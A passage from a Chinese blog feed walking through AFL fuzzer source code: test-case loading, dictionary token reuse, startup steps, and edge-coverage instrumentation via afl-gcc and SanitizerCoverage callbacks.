&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">    u8* dfn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">    u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">lstat</span>(fn, &amp;st) || <span class="built_in">access</span>(fn, R_OK))</span><br><span class="line">      <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">S_ISREG</span>(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.testcases&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">      <span class="built_in">FATAL</span>(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">            <span class="built_in">DMS</span>(st.st_size), <span class="built_in">DMS</span>(MAX_FILE));</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">       is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">       fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">       and probably very time-consuming. */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">access</span>(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">ck_free</span>(dfn);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">add_to_queue</span>(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(nl); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!queued_paths) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">         <span class="string">&quot;Looks like there are no valid test cases in the input directory! The fuzzer\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    needs one or more test case to start with - ideally, a small file under\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    1 kB or so. The cases must be stored as regular files directly in the\n&quot;</span></span><br><span class="line">         <span class="string">&quot;    input directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">FATAL</span>(<span class="string">&quot;No usable test cases in &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  last_path_time = <span class="number">0</span>;</span><br><span class="line">  queued_at_start = queued_paths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>读取输入目录中的所有测试用例并将其排队等待测试，此函数在启动时调用。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Auto-detect non-in-place resumption attempts. */</span></span><br><span class="line"></span><br><span class="line">fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/queue&quot;</span>, in_dir);</span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">access</span>(fn, F_OK)) in_dir = fn; <span class="keyword">else</span> <span class="built_in">ck_free</span>(fn);</span><br></pre></td></tr></table></figure><p>检查是否存在<code>&lt;in-dir&gt;/queue</code>目录，存在的话设置为新的<code>in_dir</code>，为了支持恢复之前的模糊测试会话</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* We use scandir() + alphasort() rather than readdir() because otherwise,</span></span><br><span class="line"><span class="comment"> the ordering  of test cases would vary somewhat randomly and would be</span></span><br><span class="line"><span class="comment"> difficult to control. */</span></span><br><span class="line"></span><br><span class="line">nl_cnt = <span class="built_in">scandir</span>(in_dir, &amp;nl, <span class="literal">NULL</span>, alphasort);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (nl_cnt &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (errno == ENOENT || errno == ENOTDIR)</span><br><span class="line"></span><br><span class="line">  <span class="built_in">SAYF</span>(<span class="string">&quot;\n&quot;</span> cLRD <span class="string">&quot;[-] &quot;</span> cRST</span><br><span class="line">       <span class="string">&quot;The input directory does not seem to be valid - try again. The fuzzer needs\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    one or more test case to start with - ideally, a small file under 1 kB\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    or so. The cases must be stored as regular files directly in the input\n&quot;</span></span><br><span class="line">       <span class="string">&quot;    directory.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, in_dir);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>scandir()</code>函数遍历<code>in_dir</code>，通过<code>alphasort()</code>确保测试用例按字母顺序排序</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (shuffle_queue &amp;&amp; nl_cnt &gt; <span class="number">1</span>) &#123;</span><br><span class="line"></span><br><span class="line"><span class="built_in">ACTF</span>(<span class="string">&quot;Shuffling queue...&quot;</span>);</span><br><span class="line"><span class="built_in">shuffle_ptrs</span>((<span class="type">void</span>**)nl, nl_cnt);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果启用了<code>shuffle_queue</code>且同时存在多个测试用例，使用<code>shuffle_ptrs</code>函数随机排列测试用例</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nl_cnt; i++) &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">stat</span> st;</span><br><span class="line"></span><br><span class="line">u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line">u8* dfn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/deterministic_done/%s&quot;</span>, in_dir, nl[i]-&gt;d_name);</span><br><span class="line"></span><br><span class="line">u8  passed_det = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(nl[i]); <span class="comment">/* not tracked */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">lstat</span>(fn, &amp;st) || <span class="built_in">access</span>(fn, R_OK))</span><br><span class="line">  <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to access &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* This also takes care of . and .. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">S_ISREG</span>(st.st_mode) || !st.st_size || <span class="built_in">strstr</span>(fn, <span class="string">&quot;/README.testcases&quot;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">ck_free</span>(fn);</span><br><span class="line">  <span class="built_in">ck_free</span>(dfn);</span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (st.st_size &gt; MAX_FILE) </span><br><span class="line">  <span class="built_in">FATAL</span>(<span class="string">&quot;Test case &#x27;%s&#x27; is too big (%s, limit is %s)&quot;</span>, fn,</span><br><span class="line">        <span class="built_in">DMS</span>(st.st_size), <span class="built_in">DMS</span>(MAX_FILE));</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Check for metadata that indicates that deterministic fuzzing</span></span><br><span class="line"><span class="comment">   is complete for this entry. We don&#x27;t want to repeat deterministic</span></span><br><span class="line"><span class="comment">   fuzzing when resuming aborted scans, because it would be pointless</span></span><br><span class="line"><span class="comment">   and probably very time-consuming. */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="built_in">access</span>(dfn, F_OK)) passed_det = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">ck_free</span>(dfn);</span><br><span class="line"></span><br><span class="line"><span class="built_in">add_to_queue</span>(fn, st.st_size, passed_det);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>过滤非常规文件、空文件和README文件；将有效的测试用例添加到队列</p><h4 id="load-auto"><a href="#load-auto" class="headerlink" title="load_auto"></a>load_auto</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">load_auto</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  u32 i;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; USE_AUTO_EXTRAS; i++) &#123;</span><br><span class="line"></span><br><span class="line">    u8  tmp[MAX_AUTO_EXTRA + <span class="number">1</span>];</span><br><span class="line">    u8* fn = <span class="built_in">alloc_printf</span>(<span class="string">&quot;%s/.state/auto_extras/auto_%06u&quot;</span>, in_dir, i);</span><br><span class="line">    s32 fd, len;</span><br><span class="line"></span><br><span class="line">    fd = <span class="built_in">open</span>(fn, O_RDONLY, <span class="number">0600</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>) &#123;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (errno != ENOENT) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to open &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line">      <span class="built_in">ck_free</span>(fn);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We read one byte more to cheaply detect tokens that are too</span></span><br><span class="line"><span class="comment">       long (and skip them). */</span></span><br><span class="line"></span><br><span class="line">    len = <span class="built_in">read</span>(fd, tmp, MAX_AUTO_EXTRA + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">0</span>) <span class="built_in">PFATAL</span>(<span class="string">&quot;Unable to read from &#x27;%s&#x27;&quot;</span>, fn);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &gt;= MIN_AUTO_EXTRA &amp;&amp; len &lt;= MAX_AUTO_EXTRA)</span><br><span class="line">      <span class="built_in">maybe_add_auto</span>(tmp, len);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">close</span>(fd);</span><br><span class="line">    <span class="built_in">ck_free</span>(fn);</span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (i) <span class="built_in">OKF</span>(<span class="string">&quot;Loaded %u auto-discovered dictionary tokens.&quot;</span>, i);</span><br><span class="line">  <span class="keyword">else</span> <span class="built_in">OKF</span>(<span class="string">&quot;No auto-generated dictionary tokens to reuse.&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将之前模糊测试会话中发现的有价值的字节序列(token)加入字典中，用于新的模糊测试会话</p><blockquote><p>会发现上述涉及两个概念：token 和 字典</p><p>字典里存储着afl-fuzz认定的有效token，存在必要性</p><p>例如：png文件的文件头是<code>IHDR</code>，当afl-fuzz变异到<code>I</code>字节后，因为发生了错误，所以走到了一个不同的执行路径，然后继续<code>H</code> <code>D</code> <code>R</code>的变异，会发现与字节<code>I</code>变异走到了同一个执行路径，都发生了同一个错误，那么afl-fuzz会认定<code>IHDR</code>是一个有效的、不可分割的字节单元，将其加入字典后，再次用fuzz遇到它就不会再进行逐字节的变异了</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">pivot_inputs</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (extras_dir) <span class="built_in">load_extras</span>(extras_dir);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!timeout_given) <span class="built_in">find_timeout</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">detect_file_args</span>(argv + optind + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!out_file) <span class="built_in">setup_stdio_file</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">check_binary</span>(argv[optind]);</span><br><span class="line"></span><br><span class="line">start_time = <span class="built_in">get_cur_time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (qemu_mode)</span><br><span class="line">use_argv = <span class="built_in">get_qemu_argv</span>(argv[<span class="number">0</span>], argv + optind, argc - optind);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">use_argv = argv + optind;</span><br><span class="line"></span><br><span class="line"><span class="built_in">perform_dry_run</span>(use_argv);</span><br><span class="line"></span><br><span class="line"><span class="built_in">cull_queue</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">show_init_stats</span>();</span><br><span class="line"></span><br><span class="line">seek_to = <span class="built_in">find_start_position</span>();</span><br><span class="line"></span><br><span class="line"><span class="built_in">write_stats_file</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"><span class="built_in">save_auto</span>();</span><br></pre></td></tr></table></figure><p><code>pivot_inputs</code>：规范命名，优先使用硬链接而非复制，记录测试用例之间的派生关系</p><p><code>load_extras</code>：可以通过设置<code>-x</code>选项加载任意一个dict文件（字典）或者目录</p><p><code>find_timeout</code>：设置超时时间</p><p><code>detect_file_args&amp;&amp;setup_stdio_file</code>：检测末尾是否有<code>@@</code></p><ul><li>如果有<code>@@</code>，则afl-fuzz会从文件读取，无论是默认的<code>&lt;out_dir&gt;/.cur_input</code>还是用户指定的（-f）。</li><li>如果没有<code>@@</code>但有-f，则表明afl会从用户指定的文件读取</li><li>如果没有<code>@@</code>且没有-f，则表明从标准输入读取。</li></ul><p><code>check_binary</code>：检查二进制文件的合法性</p><p><code>get_cur_time</code>：获取当前的准确时间</p><p><code>get_qemu_argv</code>：解析qemu的参数</p><p>例如：<code>./afl-fuzz -Q -i testcases/input -o findings -- ./target_binary @@</code>运行这个命令</p><p>那么在该函数中就会将其解析成：<code>./afl-qemu-trace -- ./target_binary @@</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;afl-fuzz源码阅读&quot;&gt;&lt;a href=&quot;#afl-fuzz源码阅读&quot; class=&quot;headerlink&quot; title=&quot;afl-fuzz源码阅读&quot;&gt;&lt;/a&gt;afl-fuzz源码阅读&lt;/h2&gt;&lt;figure class=&quot;highlight cpp&quot;&gt;&lt;ta</summary>
      
    
    
    
    
    <category term="Fuzz" scheme="http://s1nec-1o.github.io/tags/Fuzz/"/>
    
  </entry>
  
  <entry>
    <title>AFL源码阅读之afl-gcc&amp;afl-as</title>
    <link href="http://s1nec-1o.github.io/2025/07/28/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-gcc&amp;afl-as/"/>
    <id>http://s1nec-1o.github.io/2025/07/28/AFL%E6%BA%90%E7%A0%81%E9%98%85%E8%AF%BB%E4%B9%8Bafl-gcc&amp;afl-as/</id>
    <published>2025-07-28T12:56:29.000Z</published>
    <updated>2025-07-28T13:17:47.123Z</updated>
    
    <content type="html"><![CDATA[<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p><strong>basic block(基本块)、edge(边)、代码覆盖率</strong></p><p>edge就被用来表示在基本块之间的跳转，知道了每个基本块和跳转的执行次数，就可以知道程序中的每个语句和分支的执行次数，从而获得比记录BB更细粒度的覆盖率信息</p><p>代码覆盖率是一种度量代码的覆盖程度的方式，也就是指源代码中的某行代码是否已执行；对二进制程序，还可将此概念理解为汇编代码中的某条指令是否已执行。</p><p><strong>覆盖率劫持：</strong></p><ol><li><p>劫持汇编器（afl-gcc、afl-clang、afl-g++），通过识别跳转指令，然后在其中插入一段汇编用于与AFL之间的通信(<code>__afl_maybe_log</code>)</p></li><li><p>clang内置，LLVM 内置了一个简单的代码覆盖率检测 （SanitizerCoverage），它在函数、基本块和边缘级别插入对用户定义函数的调用。提供了这些回调的默认实现，并实现了简单的覆盖率报告和可视化</p><p>编译器将在 <code>-fsanitize-coverage=trace-pc-guard</code> 每个边缘插入以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sanitizer_cov_trace_pc_guard(<span class="type">uint32_t</span>* guard_variable)</span><br></pre></td></tr></table></figure><p>每条边都有自己的 guard_variable，每当对应的edge被执行到时，都会向共享内存中对list[*guard_variable]进行++操作</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//该函数处于AFL/llvm_mode/afl-llvm-rt.o.c</span></span><br><span class="line"><span class="comment">/* The following stuff deals with supporting -fsanitize-coverage=trace-pc-guard.</span></span><br><span class="line"><span class="comment">   It remains non-operational in the traditional, plugin-backed LLVM mode.</span></span><br><span class="line"><span class="comment">   For more info about &#x27;trace-pc-guard&#x27;, see README.llvm.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">   The first function (__sanitizer_cov_trace_pc_guard) is called back on every</span></span><br><span class="line"><span class="comment">   edge (as opposed to every basic block). */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard(<span class="type">uint32_t</span>* guard) &#123;</span><br><span class="line">  __afl_area_ptr[*guard]++;<span class="comment">//__afl_area_ptr是共享内存的指针</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span> *start, <span class="type">uint32_t</span> *stop);</span><br></pre></td></tr></table></figure><p>这个函数会在可执行文件开始执行时会调用一次，每一个有向边对应一个<code>*guard</code>值，参数start是第一个guard指针，代表第一条边；stop是最后一个guard指针，代表最后一条边，遍历start到stop就可以给每个guard指针指向的值初始化一个随机数（但是实际上这个值可以由用户来决定）</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//AFL/llvm_mode/afl-llvm-rt.o.c</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard(<span class="type">uint32_t</span>* guard) &#123;</span><br><span class="line">  __afl_area_ptr[*guard]++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Init callback. Populates instrumentation IDs. Note that we&#x27;re using</span></span><br><span class="line"><span class="comment">   ID of 0 as a special value to indicate non-instrumented bits. That may</span></span><br><span class="line"><span class="comment">   still touch the bitmap, but in a fairly harmless way. */</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span>* start, <span class="type">uint32_t</span>* stop) &#123;</span><br><span class="line"></span><br><span class="line">  u32 inst_ratio = <span class="number">100</span>;</span><br><span class="line">  u8* x;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (start == stop || *start) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  x = <span class="built_in">getenv</span>(<span class="string">&quot;AFL_INST_RATIO&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (x) inst_ratio = <span class="built_in">atoi</span>(x);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!inst_ratio || inst_ratio &gt; <span class="number">100</span>) &#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;[-] ERROR: Invalid AFL_INST_RATIO (must be 1-100).\n&quot;</span>);</span><br><span class="line">    <span class="built_in">abort</span>();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make sure that the first element in the range is always set - we use that</span></span><br><span class="line"><span class="comment">     to avoid duplicate calls (which can happen as an artifact of the underlying</span></span><br><span class="line"><span class="comment">     implementation in LLVM). */</span></span><br><span class="line"></span><br><span class="line">  *(start++) = <span class="built_in">R</span>(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;<span class="comment">//初始化初始值</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> (start &lt; stop) &#123;<span class="comment">//为每一个*guard赋初始值*start = R(MAP_SIZE - 1) + 1;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">R</span>(<span class="number">100</span>) &lt; inst_ratio) *start = <span class="built_in">R</span>(MAP_SIZE - <span class="number">1</span>) + <span class="number">1</span>;<span class="comment">//#  define R(x) (random() % (x))【random随机数】</span></span><br><span class="line">    <span class="keyword">else</span> *start = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    start++;<span class="comment">//指针遍历（uint32_t）</span></span><br><span class="line"></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>但是不可避免的，会有概率出现冲突的情况，因此Sakura师傅对其进行了替换：</p></blockquote><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __sanitizer_cov_trace_pc_guard_init(<span class="type">uint32_t</span>* start, <span class="type">uint32_t</span>* stop) &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> N = <span class="number">0</span> ;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;@sakura in __sanitizer_cov_trace_pc_guard_init\n&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(start == stop || *start) <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">for</span> (uint32* x = start ; x &lt; stop ; x++)&#123;</span><br><span class="line">        *x = (++N) % MAP_SIZE;<span class="comment">//mod map_size（1 &lt;&lt; 16 == 65536）</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;@sakura there are %u guards in total\n&quot;</span>,N);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要想对每条edge进行插桩，需要先在make afl时传入AFL_TRACE_PC&#x3D;1来定义DUSE_TRACE_PC宏（<code>make AFL_TRACE_PC=1</code>），然后在执行afl-clang-fast的时候传入<code>-fsanitize-coverage=trace-pc-guard</code>参数即可。正常make会启用<code>afl-llvm-pass</code>而非<code>afl-llvm-rt</code></p></li><li><p>GCOV、LCOV</p><p>覆盖率记录的实现除了前两种方式之外还可以使用GCOV、LCOV这两个东西可视化展示代码覆盖率，但是不能使用到fuzzer上。</p></li></ol><p><strong>一些fuzz的覆盖率反馈和引导变异的一些概念：</strong></p><p>fuzz有<code>生成式fuzz</code>和<code>变异式fuzz</code>两种，生成式fuzz就是一开始什么种子也没有，纯根据fuzzer的逻辑来生成种子（输入），fuzz过程中没有任何的反馈，也不会根据某时某刻的代码覆盖率来把interesting case变异发现新的路径。 AFL采用的是变异式fuzz</p><p>进行fuzz时，对样本进行变异，然后在找到新的路径时，将当前变异后数据当成一个新的样本继续变异。经过逐代的变异杂交选优，直到达到一个局部最优解为止（已发现的路径达到max），这就是所谓的**<font style="color:#E8323C;">遗传算法</font>**。</p><p>因为遗传算法的特征总是来自于<strong>初始种子样本</strong>和<strong>变异策略</strong>，所以改进也主要在这两方面。种子也可以是一些代码语句：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> cyberangel;</span><br></pre></td></tr></table></figure><p>如果变异器不会引入新的token（特征），那永远就只会生成select这一种特征，而不会生成如SQL语句中的insert、delete等。所以种子的变异策略也十分的重要，它极大的影响着fuzz的代码覆盖率。</p><p>除了对种子的不断变异，我们还需要了解AFL如何将自动或半自动生成的随机数据输入到被fuzzer的程序中并监视如崩溃，断言（assertion）等程序异常这个过程，也就是进行输入和捕获crash。AFL采用的是<code>fork server</code>这种机制，具体方式如下：</p><ol><li>fuzzer变异生成新样本后会将它们写入到执行文件目录的.cur_input隐藏文件夹中</li><li>afl-fuzz会fork出一个子进程作为fork 